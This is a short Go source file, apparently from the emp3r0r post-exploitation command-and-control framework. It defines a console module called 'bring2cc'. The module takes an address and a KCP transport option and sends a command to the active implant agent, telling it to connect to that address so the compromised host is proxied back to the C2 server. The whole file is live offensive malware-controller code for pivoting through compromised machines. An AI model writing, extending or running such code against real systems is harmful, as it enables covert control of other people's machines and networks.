package cc

import (
	"fmt"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func moduleBring2CC() {
	addrOpt, ok := AvailableModuleOptions["addr"]
	if !ok {
		LogError("Option 'addr' not found")
		return
	}
	addr := addrOpt.Val

	kcpOpt, ok := AvailableModuleOptions["kcp"]
	if !ok {
		LogError("Option 'kcp' not found")
		return
	}
	use_kcp := kcpOpt.Val

	cmd := fmt.Sprintf("%s --addr %s --kcp %s", emp3r0r_def.C2CmdBring2CC, addr, use_kcp)
	err := SendCmd(cmd, "", ActiveAgent)
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
	LogInfo("agent %s is connecting to %s to proxy it out to C2", ActiveAgent.Tag, addr)
}
